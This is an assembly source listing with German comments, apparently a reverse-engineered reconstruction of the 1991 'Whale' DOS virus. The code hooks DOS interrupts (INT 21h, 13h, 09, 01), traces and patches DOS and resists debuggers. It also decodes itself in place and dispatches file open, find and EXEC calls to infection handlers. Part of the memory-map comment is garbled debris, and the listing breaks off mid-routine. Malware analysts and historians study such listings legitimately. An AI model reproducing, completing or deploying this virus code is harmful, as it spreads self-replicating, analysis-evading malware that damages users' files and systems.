

;=====================================================================
;=====================================================================
;       The WHALE                                                    ;
;                                                                    ;
;       Listing erstellt 1991 , R. H”rner , Karlsruhe , FRGDR        ;
;                                                                    ;
;=====================================================================
;=====================================================================
code            SEGMENT
                ASSUME  CS:code,DS:code,ES:CODE
                .RADIX 16
                ORG     100h
;---------------------------------------------------------------------
;----------------( Struktur der Entscheidungs-Tabelle fr INT 21h )---
;---------------------------------------------------------------------
IF_THEN         STRUC
WENN            DB      ?
DANN            DW      ?
                ENDS
;==========================================( Der Decoder-Aufruf   )===
MDECODE         MACRO   Adr
                CALL    DECODE
                DW      @L&adr-L&Adr
L&Adr:
                ENDM
;==========================================( der Coder-Aufruf     )===
MCODE           MACRO   Adr
                CALL    CODEIT
                DB      @L&Adr-L&Adr+1
@L&Adr:
                ENDM
;---------------------------------------------------------------------
;--------------------------------------------------( fr Mutanten )---
L04BB5          EQU     OFFSET D4BB5
J00000          EQU     L04BB5 - Offset Entry
J11111          EQU     L04BB5 - Offset @INT21
ZweiByte        EQU     J00000 / 2
DreiByte        EQU     J00000 / 3
M_Size          EQU     OFFSET J03AD0-OFFSET J03A84
;---------------------------------------------------------------------
;-------------------------------------------( "Mutierende" Makros )---
;---------------------------------------------------------------------
CALL_INT21      MACRO   Adr,adr1                ; Selbst-Relozierend

                DB      0E8H
                DW      - (LL&ADR + J11111 + 1)
LL&ADR          EQU     $-OFFSET ADR1
                ENDM
;---------------------------------------------------------------------
CALL_ENTRY      MACRO   Adr,adr1                ; Selbst-Relozierend
                DB      0E8H
                DW      - (CE&ADR + J00000 )
CE&ADR          EQU     $-OFFSET ADR1
                ENDM
;---------------------------------------------------------------------
JMP_ENTRY       MACRO   Adr,adr1                ; Selbst-Relozierend
                DB      0E9H
                DW      - (JM&ADR + J00000 )
JM&ADR          EQU     $-OFFSET ADR1
                ENDM
;=====================================================================
;===============================================( zur relozierung )===
;=====================================================================
FirstByte       EQU     OFFSET @FirstByte-OFFSET VirStart      ;   20h
CODE_LEN        EQU     OFFSET LASTCODE-OFFSET @FirstByte      ; 2385H
CODE_START      EQU     OFFSET J04BCF - OFFSET @FirstByte      ; 239FH
;=====================================================================
;============================================( ver„nderlicher Code)===
;=====================================================================
SwapCode_1      EQU     Offset Decode - Offset VirStart        ; 0A33h
Swapcode_2      EQU     OFFSET J03A20 - Offset VirStart        ; 1210h
Swapcode_3      EQU     OFFSET J0491A - Offset J03047          ; 18D3h
SwapCode_4      EQU     OFFSET J03047 - Offset VirStart        ; 0837H
SwapCode_5      EQU     OFFSET J03259 - Offset VirStart        ; 0A49h
SwapCode_6      EQU     OFFSET J02CFF - Offset VirStart        ; 04EFh
SwapCode_7      EQU     Offset SwitchByte-Offset VirStart;
SwapCode_8      EQU     Offset Int_02 - Offset VirStart        ; 3181h
;=====================================================================
;========================================( einfacher zu schreiben )===
;=====================================================================
XorByte__1      EQU     OFFSET D_4A5E - Offset VirStart        ; 224Eh
XorByte__2      EQU     OFFSET D_4A79 - Offset VirStart        ; 2269h
;=====================================================================
Part_____1      EQU     OFFSET D4BAC  - OFFSET VirStart        ; 239Ch
Len_Part_1      EQU     OFFSET Lastbyte - Offset D4BAC         ; 0054h
;=====================================================================
SchwimmZiel     EQU     OFFSET J029C1 - Offset VirStart        ; 01B1h
WischeWeg       EQU     OFFSET D4B7C  - Offset VirStart        ; 236Ch
;=====================================================================
SS_INIT         EQU     Offset EXE_SS_INIT-Offset VirStart
SP_INIT         EQU     Offset EXE_SP_INIT-Offset VirStart
CODE_INIT       EQU     Offset EXE_CODE_INIT-Offset VirStart
;=====================================================================
;=============================( Sprungtabelle fr Int 21h-Handler )===
;=====================================================================
L0699           EQU     Offset J02ea9 - Offset VirStart
L04f4           EQU     Offset J02D04 - Offset VirStart
L06E0           EQU     Offset J02EF0 - Offset VirStart
L06CA           EQU     Offset J02EDA - Offset VirStart
L08CF           EQU     Offset J030DF - Offset VirStart
L06C8           EQU     Offset J02ED8 - Offset VirStart
L0996           EQU     Offset J031A6 - Offset VirStart
L09E4           EQU     Offset J031F4 - Offset VirStart
L1E5E           EQU     Offset J0466E - Offset VirStart
L1DA2           EQU     Offset J045B2 - Offset VirStart
L0AD4           EQU     Offset J0325D - Offset VirStart
L1F70           EQU     Offset J04780 - Offset VirStart
L1D0F           EQU     Offset J0451F - Offset VirStart
;=====================================================================
;==============================( wenn ein Debugger erkannt wird...)===
;=====================================================================
IfDebugWal      EQU     (Offset J04B6A-Offset CreateTempCode+1) / 2
StartDebug      EQU      Offset CreateTempCode-Offset VirStart
;=====================================================================
;==========================================( Erkl„rung fehlt noch )===
;=====================================================================
@0478           EQU     0478H
@FB88           EQU     10000h-@0478
;=====================================================================
;=================================================( COM-Einsprung )===
;=====================================================================
start:          JMP     ENTRY           ; JMP     Decode_Whale
                DB      00h
Whale_ID        DW      020CCh          ; kennung, daá File infiziert
;=====================================================================
                DB      2300h-6 DUP       (0)
;---------------------------------------------------------------------
;
;       DIESE DATEN WERDEN ZWAR **VOR** DEN CODE
;       ASSEMBLIERT,  ABER ***HINTER*** DEM CODE ABGELEGT !!
;
;       DAS IST DER ***EINZIGE GRUND*** WARUM DIE VIELEN
;       NULL-BYTES VOR DEM WAL STEHEN !!!
;
;       DER CODE IST Code_len BYTE LANG.
;
;       AB OFFSET Code_len DšRFEN ALSO DATEN STEHEN.
;       DESHALB GIBT ES AUCH KEINE DATEN, DIE ***VOR*** DIESEM
;       OFFSET ABGELEGT WERDEN !
;====================================================================
;===========================================( Speichereinteilung )===
;====================================================================
;       Assemblierungszeit :   Zur Laufzeit (resident):
;
;       +-CS:0100=DS:0100-+    +--CS:0000-DS:2810-+  <- segment="" 9d90h="" ;="" |="" |="" |="" code="" |="" ;="" |="" leer="" |="" |="" |="" ;="" |="" |="" |="" |="" ;="" +-cs:2400="DS:2400-+" +--cs:2400-ds:4c10-+="" (ds:4c43="CS:2433!)" ;="" |="" daten="" |="" |="" daten="" |="" ;="" +-cs:2700="DS:2700-+" +--cs:2700-ds:4f10-+=""></-><--speicherbedarf ;="" |="" leer="" |="" |="" grafikkarte="" |="" incl.="" zugriff="" auf="" ;="" +-cs:2800="DS:2800-+" |="" |="" residenten="" ;="" |="" save-daten+code="" |="" |="" |="" command.com="" ;="" +-cs:2810="DS:2810-+" |="" |="" ;="" |="" |="" |="" |="" ;="" |="" code="" |="" |="" |="" ;="" |="" |="" |="" |="" ;="" +-cs:4c00="DS:4C00-+" +------------------+="" ;="" ;---------------------------------------------------------------------="" offset_2400:="" codbuf="" db="" 1ch="" dup="" (?)="" ;="" wirts-file-beginn="" puffer="" ;---------------------------------------------------------------------="" d241c="" db="" d241d="" db="" d241e="" dw="" d2420="" dw="" d2422="" dw="" d2424="" dd="" ;="" adresse="" des="" exec-param-blocks="" d2428="" db="" ;="" drive="" des="" aktuellen="" files="" filetime="" dw="" ;="" file-uhrzeit="" filedate="" dw="" ;="" file-datum="" trace_adres="" dd="" ;="" temp-dd="" fr="" trace-adresse="" d2431="" dw="" d2433="" db="" ;="" "1"="" :="" nach="" verschluesselung="" int="" 21h="" ;="" ausfhren="" und="" wieder="" entschluesseln.="" d2434="" db="" low_int_21h="" dd="" ;="" ibmdos-adresse="" int="" 21h="" @int_13h="" dd="" ;="" adresse="" int="" 13h="" d243d="" dd="" ;="" adresse="" int="" 24h="" psp_seg="" dw="" ;="" psp-segment="" d2443="" dw="" d2445="" dw="" d2447="" dw="" ;="" erster="" mcb="" tracesegment="" d2449="" dw="" ;---------------------------------------------------------------------="" ;--------------------------------------------(="" wird="" "jmp="" cs:2256"="" )---="" ;--------------------------------------------(="" also="" "jmp="" virint21")---="" d244b="" db="" d244c="" dw="" d244e="" dw="" ;---------------------------------------------------------------------="" d2450="" dw="" ;="" trace-kontrollwort="" d2452="" dw="" 14h="" dup="" (?)="" d247a="" dw="" 14h="" dup="" (?)="" d24a2="" db="" ;="" @psp="" dw="" ;="" aktuelles="" psp-segment="" filepos="" dd="" ;="" file-pos="" filesize="" dd="" ;="" file-size="" d24ad="" dw="" ;="" offset="" des="" caller-lese-puffers="" d24af="" dw="" ;="" anzahl="" der="" zu="" lesenden="" byte="" d24b1="" dw="" d24b3="" dw="" ;="" callers="" -="" flags="" !="" d24b5:="" @fcb="" db="" 25h="" dup="" (?)="" ;="" fcb="" error="" db="" ;="" error="" aufgetreten="" ;="" 24da="" d24db="" dw="" d24dd="" dw="" ;="" platz="" fr="" ss="" d24df="" dw="" ;="" platz="" fr="" sp="" d24e1="" dw="" d24e3="" dw="" ;="" platz="" fr="" ax="" d24e4="" dw="" ;---------------------------------------------------------------------="" d24e6="" dw="" ;="" caller-ip="" d24e8="" dw="" ;="" caller-cs="" d24ea="" dw="" ;="" returnadresse="" zwischen="" push/pop="" d24ec="" dw="" ;="" d24ee="" db="" d24ef="" db="" ;---------------------------------------------------------------------="" d24f0="" db="" epb="" db="" ;="" start="" epb="" d24f2="" dw="" ;="" file-attribut="" d24f4="" dw="" ;="" offset="" filename="" asciiz="" d24f6="" dw="" ;="" segment="" filename="" asciiz="" d24f8="" dw="" ;="" d24fa="" dw="" ;="" d24fc="" dw="" d24fe="" db="" ;---------------------------------------------------------------------="" d24ff="" dw="" ;="" sp-init="" d2501="" dw="" ;="" ss-init="" d2503="" dw="" ;="" ip-init="" d2505="" dw="" ;="" cs-init="" ;---------------------------------------------------------------------="" cmd_line="" db="" 50h="" dup="" (?)="" ;="" command-line="" ;---------------------------------------------------------------------="" d2557="" dw="" ;="" orig.sp="" d2559="" dw="" ;="" orig.ss="" vir_sp="" dw="" ;="" vir.="" sp="" d245d="" dw="" d245f="" db="" d2560="" dw="" ;="" platz="" fr="" ax="" d2562="" dw="" ;="" platz="" fr="" bx="" d2564="" dw="" ;="" platz="" fr="" cx="" ;-------------------------------(="" als="" virtuelle="" code-area="" genutzt="" )---="" @int21="" dd="" ;="" adresse="" original="" int="" 21h="" d256a="" dw="" d256c="" dw="" d256e="" dw="" ;-------------------------------------------(="" wird="" "jmp="" cs:2273"="" )---="" ;-------------------------------------------(="" also="" "jmp="" virint09"="" )---="" d2570="" db="" d2571="" dw="" d2573="" dw="" ;---------------------------------------------------------------------="" d2575="" dw="" ;="" save="" si="" d2577="" dw="" ;="" save="" di="" d2579="" dw="" ;="" save="" ax="" d257b="" dw="" ;="" save="" ds="" d257d="" dw="" ;="" save="" es="" d257f="" dw="" ;="" save="" cx="" ;---------------------------------------------------------------------="" d2581="" dw="" ;="" save="" bx="" int_09="" dd="" ;="" original="" int="" 09="" d2587="" db="" ;="" wird="" bei="" j02975="" geschrieben="" d2588="" dw="" d258a="" dw="" infectflag="" db="" ;="" "1"="" nach="" der="" ersten="" infektion="" d258d="" db="" d258e="" dw="" ;="" platz="" fr="" flags="" ;---------------------------------------------------------------------="" d2590="" dw="" ;="" save="" dx="" @int02="" dd="" ;="" originaler="" int="" 02="" trashflag="" db="" ;="" "1"="" :="" statt="" einer="" infektion,="" ;="" wird="" trash="" weggeschrieben="" d2597="" db="" d2598="" dw="" ;="" hier="" kommt="" z.b.="" "hlt"="" hin...="" d259a="" dw="" ;="" ;---------------------------------------------------------------------="" d259c="" dd="" d25a0="" db="" 160h="" dup="" (0)="" d2700:="" ;="" virus-stack="" -^^^="" ;---------------------------------------------------------------------="" db="" 100="" dup="" (0)="" j02801:="" db="" 0="" j02802:="" db="" 0="" j02803:="" db="" 0="" j02804:="" db="" 0="" j02805:="" db="" 0="" j02806:="" db="" 0="" j02807:="" db="" 0="" ;---------------------------------------------------------------------="" j02808:="" mov="" ah,4ch="" ;="" main()="" :-)))="" mov="" al,[errorcode]="" int="" 21="" errorcode="" db="" 00h="" ;---------------------------------------------------------------------="" ;="" hier="" beginnt="" whale="" ;---------------------------------------------------------------------="" virstart:="" db="" 00h="" ;02810="" j02811:="" jmp="" decode_whale="" ;="====================================================================" ;="=====(" puffer="" fr="" die="" ersten="" 1ch="" byte="" des="" infizierten="" programmes)="==" ;="====================================================================" exe_id:="" dw="" 04cb4h="" ;="" 'mz'="" mov="" ah,4c="" exe_lastbytes:="" dw="" 021cdh="" ;="" lastbytes="" int="" 21="" exe_pages:="" dw="" 0="" ;="" pages="" exe_rel_count="" dw="" 0="" ;="" reloc-count="" exe_paras:="" dw="" 0="" ;="" headerpara="" exe_minfree:="" dw="" 0="" ;="" minfree="" exe_maxfree:="" dw="" 0="" ;="" maxfree="" exe_ss_init:="" dw="" 0="" ;="" ss-init="" exe_sp_init:="" dw="" 0="" ;="" sp-init="" exe_bytesum:="" dw="" 0="" ;="" bytesum="" exe_code_init:="" dd="" 0="" ;="" ip-init,="" cs-init="" exe_reloc_ofs:="" dw="" 0="" ;="" reloc-offset="" exe_ovl_num:="" dw="" 0="" ;="" ovl-num="" ;---------------------------------------------------------------------="" @firstbyte:=""></--speicherbedarf><----------------( erstes="" byte="" im="" oberen="" segment="" )---="" exe_flag="" db="" 0="" ;="" "1"="" :="" exe-file="" ;="====================================================================" ;="=================================(" erster="" call="" nach="" dekodierung="" )="==" ;="=================================(" 'echter'="" einsprung="" )="==" ;="====================================================================" offset_2831:="" entry:="" call="" j0288e="" ;---------------------------------------------------------------------="" vir_name:="" db="" "the="" whale"="" ;---------------------------------------------------------------------="" db="" 0ffh="" db="" 036h="" db="" 0c7h="" ;----------------------------------------------------------(trash?)---="" push="" es="" j02842:="" push="" bx="" inc="" word="" ptr="" ds:[0458h]="" ;="" evtl="" cursor-loc="" auf="" jnz="" j0284c="" ;="" page="" 5="" (??!??)="" jmp="" j02a4f="" ;="" -=""> Nirwana
;====================================================()===============
J0284C:         MOV     AX,CS:[BX]
                ADD     BX,+02h

J02852:         JZ      J0287E                  ; = RET nach altem BX
                ADD     CS:[BX],AX
                LOOP    J0284C
                POP     BX
                DB      9fh,06h
;=====================================================================
;==================( folgender Code wird an Adresse 2566h erzeugt )===
;=====================================================================
;@INT21:        DW      2568h           ; fr "call word ptr [@int21]"
;D2568:         PUSHF
;               CALL    FAR CS:[Low_INT_21H]  ; CALL OLD INT 21
;               RET
;---------------------------------------------------------------------
CreateTempCode: MOV     Word Ptr DS:[@INT21  ],Offset @INT21+2
                POP     BX
                MOV     WORD Ptr DS:[@INT21+2],2E9Ch
                ADD     BX,+02h                 ; SIC !
                MOV     WORD Ptr DS:[D256A],1EFFh
                MOV     WORD Ptr DS:[D256C],OFFSET Low_INT_21H
                PUSH    BX
                MOV     WORD Ptr DS:[D256E],00C3h
J0287E  EQU     $-1                             ; zeigt auf "RET"
                MOV     WORD Ptr DS:[Vir_SP],2700h
EIN_RETURN:     RETN                            ; RETURN 2 Byte weiter
;=====================================================================
;---------------------------------------------------------( Trash )---
J02887:         PUSH    CX
                MOV     CX,CS:[BX]
                DB      2eh,8bh,1Eh
;=====================================================================
;====================================( Teil-Initialisierung von SI)===
;====================================( IRET fhrt nach J02983     )===
;====================================( Wird als erstes ausgefhrt )===
;=====================================================================
J0288E:         POP     BX
                ADD     BX,OFFSET J02983-Offset Vir_NAME
                PUSHF
                PUSH    CS
                PUSH    BX
                MOV     SI,BX                   ; BX = SI = 2983h
                IRET
;---------------------------------------------------------( Trash )---
                DB      0E9h,031h,002h,0ffh,0b4h,029h
                DB      001h,059h,02eh,0ffh,007h,02eh
                DB      023h,037h,05fh,0f3h,0a4h,0EBh
;====================================================================
J028AB:         PUSH    DS                ; altes DS auf Stack
                PUSH    CS
                POP     DS
                CALL    CreateTempCode    ; Return ist 1 word weiter !
                ;--------------
                DW      58EAh
                ;--------------
;=====================================================================
;==================================================( Code-Patcher )===
;=====================================================================
;       BX zeigt auf J03047
;       aus     "CMP BX,SI"
;       wird
;       J03074: XOR     CS:[SI],BX
;               NOP
;               RET
;---------------------------------------------------------------------
;
J028B3:         MOV     BX,OFFSET J03047-Offset VirStart
                XOR     WORD Ptr DS:[BX],0EF15h
                ADD     BX,+02h
                XOR     WORD Ptr DS:[BX],4568h
                MOV     SI,OFFSET J0491A-OFFSET VirStart
                POP     DS                        ; Altes DS zurck
                CALL    PATCH                     ; Gleich ausfhren !
;=====================================================================
;======================================( WAL ist jetzt erst scharf)===
;=====================================================================
AFTER_PATCH:    MDECODE  1

                CALL    StopINT_02

                MOV     CS:[D24E3],AX
                MOV     AH,52h                     ; sic !
                MOV     CS:[PSP_SEG],DS
                INT     21
                MOV     AX,ES:[BX-02h]             ; Hole ersten MCB !
                MOV     CS:[D2447],AX
                PUSH    CS
                POP     DS
 
                MOV     AL,21h
                CALL    GetInt_AL

                MOV     WORD PTR DS:[Trace_Adres+2],ES   ; Get INT 21h
                MOV     WORD PTR DS:[Trace_Adres  ],BX

                MOV     DX,Offset Int_01_entry-Offset VirStart
                MOV     AL,01h
                MOV     BYTE Ptr DS:[D2450],00h    ; keinen bergehen
                CALL    SetInt_AL                  ; SET INT 01
                MCODE   1
;=====================================================================
;===================================================(TRACE INT 21h)===
;=====================================================================
                MDECODE  2
                ;-----------------------------
                PUSHF
                POP     AX
                OR      AX,0100h                ; Tf ein
                PUSH    AX
                POPF
                ;-----------------------------
                PUSHF
                MOV     AH,61h
                CALL    DWORD PTR DS:[Trace_Adres]; TRACE INT 21
                ;-----------------------------
                PUSHF
                POP     AX
                AND     AX,0FEFFh                ; TF aus
                PUSH    AX
                POPF
                ;-----------------------------
                LES     DI,DWORD PTR DS:[Trace_Adres] ; Old int 21h
                ;-----------------------------
                ; Erzeugt JMP CS:2256/J04A66
                ;-----------------------------
                MOV     WORD PTR DS:[Low_INT_21H+2],ES
                MOV     BYTE Ptr DS:[D244B        ],0EAh
                MOV     WORD Ptr DS:[D244C        ],2256h
                MOV     WORD PTR DS:[Low_INT_21H  ],DI
                MOV     WORD PTR DS:[D244E        ],CS
                ;-----------------------------
                CALL    J0298D
                CALL    Patch_IBMDOS
                MCODE   2
                CALL    Wal_Ins_MEMTOP_Kopieren
;=====================================================================
                ; Wal entschwindet zur Speicherobergrenze, husch .....
;#####################################################################
;
;#####################################################################
;=====================================================================
;====================================( PATCHT INT 09-Verarbeitung )===
;=====================================================================
INT_09_Patch:   MDECODE 3
                PUSH    BX
                PUSH    ES
 
                MOV     AL,09h                    ; GET INT 09
                CALL    GetInt_AL

                MOV     WORD PTR CS:[INT_09+2],ES
                MOV     WORD PTR CS:[INT_09  ],BX

                MOV     BYTE PTR CS:[D2570],0EAh  ; PATCHE "JMP CS:2273"
                MOV     WORD PTR CS:[D2573],CS    ; INS SCRATCHPAD
                MOV     WORD PTR CS:[D2571],Offset J04A83-Offset VirStart
                                                  ; = JMP CS:4A83

                CALL    Patch_INT_09
                POP     ES
                POP     BX
J02975:         MOV     BYTE PTR CS:[D2587],00h

                MCODE   3
                RETN
;------------------------------
                DW      027E9H
                DW      0EA1Ah
;=====================================================================
;============================================( Get Virstart in SI )===
;=====================================================================
J02983:         SUB     SI,OFFSET J02983 - Offset VirStart
                JMP     J02F15                  ; SI ist jetzt 2810h
;=====================================================================
                DB      089h,0F3h,0E8H
;=====================================================================
;=========================================( Get INT 2F and INT 13 )===
;=====================================================================
J0298D:         MDECODE 4

                MOV     AL,2Fh                  ; GET INT 2F
                CALL    GetInt_AL

                MOV     BX,ES
                CMP     CS:[D2447],BX
                JNB     J029BC

                CALL    Trace_int_13h

                MOV     DS,WORD PTR CS:[Trace_Adres+2]
                PUSH    WORD PTR    CS:[Trace_Adres  ]
                POP     DX                      ; DS:DX

                MOV     AL,13h
                CALL    SetInt_AL               ; SET INT 13

                XOR     BX,BX
                MOV     DS,BX                   ; DS = 0
                MOV     BYTE Ptr DS:[0475h],02h ; Number of Hard-Drives

J029BC:         MCODE   4
                RETN
;=====================================================================
;==========================( Erste Routine, die im Oberen Speicher)===
;==========================( ausgefhrt wird.                     )===
;==========================( AB JETZT ist Offset 2810h = OFFSET 0 )===
;=====================================================================
J029C1:         MDECODE 5
                CALL    Patch_IBMDOS    ; Original wiederherstellen
                MOV     CS:[D244E],CS   ; JMP CS:2256 korrigieren..
                                        ; ist jetzt bei 4A66 ...
                CALL    Patch_IBMDOS    ; und wieder Patchen

                PUSH    CS
                POP     DS
                PUSH    DS
                POP     ES              ; ES=DS=CS
                CALL    INT_09_Patch    ; Patche INT 09

                MOV     BYTE Ptr DS:[InfectFlag],00h
                CALL    Re_SET_Int_02

                MOV     AX,[PSP_SEG]
                MOV     ES,AX
                LDS     DX,ES:[000Ah]   ; INT 22h in DS:DX
                MOV     DS,AX
                ADD     AX,0010h
                ADD     CS:[OFFSET EXE_Reloc_Ofs-Offset VirStart],AX

                CMP     BYTE PTR CS:[OFFSET EXE_FLAG-OFFSET VIRSTART],00h
                                        ; IST ES EIN EXE ??
                STI
                MCODE   5
                JNZ     J02A2E
;=====================================================================
;================================( restore Code-Start im alten CS )===
;=====================================================================
                MDECODE 6
                MOV     AX,CS:[Offset EXE_ID-Offset VirStart  ]
                MOV     WORD PTR DS:[0100h],AX
                MOV     AX,CS:[Offset EXE_ID-Offset VirStart+2]
                MOV     WORD PTR DS:[0102h],AX
                MOV     AX,CS:[Offset EXE_ID-Offset VirStart+4]
                MOV     WORD PTR DS:[0104h],AX

                PUSH    CS:[PSP_SEG]    ; PUSH Start-Segment
                XOR     AX,AX
                INC     AH
                PUSH    AX              ; AX = 100h
                MOV     AX,CS:[D24E3]
                MCODE   6
                RETF                ; == JMP PSP_SEG:100H == COM-START
;=====================================================================
;=============================================( JMP zum EXE-Start )===
;=====================================================================
J02A2E:         MDECODE 7
                ADD     CS:[SS_INIT],AX
                MOV     AX,CS:[D24E3]
                MOV     SP,CS:[SP_INIT]
J02A41:         MOV     SS,CS:[SS_INIT]
                MCODE   7
                JMP     DWORD PTR CS:[CODE_INIT]
;=========================================================(trash !)===
J02A4F:         PUSH    AX
                MOV     AX,0000h
                MOV     DS,AX
                POP     AX
                MOV     BX,Word ptr CS:[06C7h]          ; CS:2ED7 = E3CB
                MOV     Word Ptr DS:[000CH],BX          ; INT 3 setzen !
                MOV     Word Ptr DS:[000EH],CS
                DB      0E8h                            ; CALL 5DBA ?!?
;=====================================================================
;==============================================( TRACE-ROUTINE )======
;=====================================================================
J02A63:         PUSH    BP
                XOR     BX,BX
                MOV     BP,SP
                MOV     DS,BX
                AND     WORD Ptr [BP+06h  ],0FEFFh ; ? Change Flags ?
                MOV     Word Ptr DS:[0004h],AX
                MOV     Word Ptr DS:[000Eh],CS   ; SET INT 3 SEGMENT
                MOV     Word Ptr DS:[000Ch],SI   ; SET INT 3 OFFSET
                CALL    J02CD8                   ; Kein Return, sondern
                                                 ; sowas wie 'IRET'
;=====================================================================
J02A7D:
;======================================================( Trash ???)===
        DB      0E9h,0f2h,0eh
        DB      0BEh                             ;02A80
        DB      0BBh                             ;02A81
        DB      0ABh                             ;02A82
        DB      0EBh                             ;02A83
        DB      0EFh                             ;02A84
        DB      0AFh                             ;02A85
        DB      0BBh                             ;02A86
        DB      0EFh                             ;02A87
        DB       2 DUP (0ABh)                    ;02A88
        DB       2 DUP (0BFh)                    ;02A8A
        DB      0EFh                             ;02A8C
        DB      0ABh                             ;02A8D
        DB      0EBh                             ;02A8E
        DB       2 DUP (0ABh)                    ;02A8F
        DB      0BFh                             ;02A91
        DB      0EBh                             ;02A92
        DB      0EFh                             ;02A93
        DB      0EBh                             ;02A94
        DB       2 DUP (0ABh)                    ;02A95
        DB      0FBh                             ;02A97
        DB      0ABh                             ;02A98
        DB      0EBh                             ;02A99
        DB      0BFh                             ;02A9A
        DB      0BBh                             ;02A9B
        DB      0BFh                             ;02A9C
        DB      0ABh                             ;02A9D
        DB      0EBh,2Eh,80h,0fh
        DB      0abh,0e2h,0f9h
;=====================================================================
;---( Hier wird der Code neu reloziert, so daá Virstart zum       )---
;---( Offset 0 wird. Dazu wird das neue Codesegment errechnet und )---
;---( sp„ter ber RETF angesprungen. Die Routine muss ausgefhrt  )---
;---( werden, bevor der Code scharf gemacht wird. Der Patcher     )---
;---( geht vom neuen Codesegment aus.                             )---
;=====================================================================
Relokator:      CALL    DecodeFollowingCode
J02AA8:         xor     sp,sp     ; Stack verwerfen !
                call    L2AAD
L2AAD:          mov     bp,ax     ; AX = 0
                mov     ax,cs
                mov     bx,0010H
                mul     bx        ; AX = CS * 16
                pop     cx        ; CX = Offset L2AAD
                sub     cx,OFFSET L2AAD-OFFSET VIRSTART
                                  ; CX = Offset L2AAD - 29D
                                  ;    = Offset VirStart = 2810h
                add     ax,cx     ; DX:AX := CS*10+2810
                adc     dx,0000   ;
                div     bx        ; DX:AX := CS+281
                push    ax        ; Ergebnis auf Stack,
                                  ; (== Segment Returnadresse )
                mov     ax,Offset J028AB-Offset VirStart
                                  ; Offset Returnadresse ; (CS+281h):09Bh

                push    ax
                mov     ax,bp     ; AX = 0
                call    VersteckeCodeWieder
J02ACC:         retf              ; RETURN nach CS:28AB, immer !
;===========================================================(trash)===
J02ACD:         DB      0B4h,03         ; MOV     AH,03h
                DB      8bh,0D8h        ; MOV     BX,AX
                DB      0E9H            ; JMP     J02BBC
;=====================================================================
;=============================================( Setzen von INT 01 )===
;=====================================================================
J02AD2:         CALL    J02AD5
J02AD5:         POP     BX                      ; BX = 2AD5
                SUB     BX,OFFSET J02AD5-OFFSET J02A63
                                                ; BX = 2A63
                PUSH    BX                      ;
                POP     WORD PTR DS:[0004h]     ; INT 01 Offset = 2A63
                PUSH    CS
                POP     WORD PTR DS:[0006h]     ; INT 01 Segment= CS
                PUSH    CS
J02AE4:         POP     AX
                OR      AX,0F346h               ; SET TF
                PUSH    AX
                POPF

J02AEA:         XLAT                            ; MOV AL,[BX+AL]
                MOV     BH,AL                   ; MOV AL,[2AA9+x]
                ADD     BX,CX
J02AEF:         JMP     J047B1
;=========================================================( trash )===
                MOV     AX,[BX   ]
                MOV     BX,[BX+SI]
                XOR     AX,AX
                MOV     DS,AX
                JMP     J02AE4
;=====================================================================
;==========================( wird von INT 3 / INT 21h angesprungen)===
;=====================================================================
J02AFB:         MDECODE 8
                push    bx
                mov     bx,sp
                mov     bx,ss:[bx+06]   ; HOLE Flags vom Caller-Stack
                mov     cs:[D24B3],bx   ; und merke sie
                pop     bx

                push    bp              ; BP bleibt auf Stack
                mov     bp,sp
                call    StopINT_02
                call    SaveRegisters
                call    Patch_IBMDOS
                call    GetRegsFromVirStack
                call    PUSHALL
                MCODE   8
;=====================================================================
;=====================( sucht zu Wert in AL den passenden Handler )===
;=====================================================================
GetHandler:     MDECODE 9
                CALL    PushALL
                MOV     WORD PTR CS:[D2598],OFFSET J02B8B-Offset VirStart
                MOV     BX,Offset J02B45-Offset VirStart
                MOV     CX,000Fh
J02B38:         CMP     CS:[BX],AH
                JZ      J02B72
                ADD     BX,+03h
                LOOP    J02B38
                JMP     J02B7B
;=====================================================================
J02B45:         ;=================================( Tabelle )=========
                if_then    <00fh,l0699>   ; 2EA9  ; open FCB
                if_then    <011h,l04f4>   ; 2D04  ; Findfirst FCB
                if_then    <012h,l04f4>   ;       ; Findnext  FCB
                if_then    <014h,l06e0>   ; 2EF0  ; Read Seq. FCB
                if_then    <021h,l06ca>   ; 2EDA  ; Read Random FCB
                if_then    <023h,l08cf>   ; 30DF  ; Get Filesize FCB
                if_then    <027h,l06c8>   ; 2ED8  ; Read Rndm Block FCB
                if_then    <03dh,l0996>   ; 31A6  ; OPEN FILE / HANDLE
                if_then    <03eh,l09e4>   ; 31F4  ; CLOSE File / Handle
                if_then    <03fh,l1e5e>   ; 466E  ; READ File / Handle
                if_then    <042h,l1da2>   ; 45B2  ; SEEK / Handle
                if_then    <04bh,l0ad4>   ; 325D  ; EXEC
                if_then    <04eh,l1f70>   ; 4780  ; FindFirst ASCIIZ
                if_then    <04fh,l1f70>   ; 4780  ; FindNext  ASCIIZ
                if_then    <057h,l1d0f>   ; 451F  ; Set/Get Filedate
;=====================================================================
J02B72:         INC     BX
                PUSH    CS:[BX   ]
                POP     CS:[D2598]      ; Adresse in D2598
J02B7B:         CALL    PopALL
J02B7E:         MCODE 9
                JMP     CS:[D2598]      ; Springe zu [2598]
;================================================================()===
J02B87:         PUSH    SI              ; ?!?!?!
                JMP     J0491B

;=====================================================================
;==========================================( Low-INT-21h aufrufen )===
;=====================================================================
J02B8B:         JMP     J048F3
;=========================================================( trash )===
                DB      043h,041h,031h,00fh,039h,00fh,077h
;=====================================================================
;================================================( Beendet Int21h )===
;=====================================================================
IRET_Int21h:    MDECODE 10
                CALL    SaveRegisters
                CALL    Patch_IBMDOS
                CALL    GetRegsFromVirStack
J02BA3:         MOV     BP,SP
                PUSH    CS:[D24B3]              ; PUSH Flags nach IRET
                POP     [BP+06]                 ; POP  Flags ---"----
                POP     BP
                CALL    Re_SET_Int_02
                MCODE   10
                IRET
;=====================================================================
J02BB6:         DB      0D7h,03Ch,0FFh,075h
;=====================================================================
;=============================================( Pop alle Register )===
;=====================================================================
; ---------------- hilfsweise eingefgt :
;       J02BB6: XLAT
;               CMP     AL,0FFh
;               JZ      J02BA3
;               XCHG    AL,BYTE PTR DS:[0C912H] ; MUELL !!!
;               JMP     J02BBF
; ---------------- hilfsweise eingefgt :
;       J02BBC: PUSH    ES
;               ADC     CL,CL
;               JMP     J02BBF
; ---------------- Ende einfgung
;=====================================================================
;=============================================( Pop alle Register )===
;=====================================================================
J02BBC  EQU     $+2
PopALL:         MDECODE 11
J02BBF:         POP     CS:[D24EA]
                POP     ES
                POP     DS
                POP     DI
                POP     SI
                POP     DX
                POP     CX
                POP     BX
                POP     AX
                POPF
                MCODE   11
                JMP     CS:[D24EA]
;=====================================================================
                DB      0F6h
;=====================================================================
;==========================( Holt alle Register aus dem Vir-Stack )===
;=====================================================================
GetRegsFromVirstack:
                MDECODE 12
                MOV     Word Ptr CS:[D2557],SP
                MOV     Word Ptr CS:[D2559],SS
                PUSH    CS
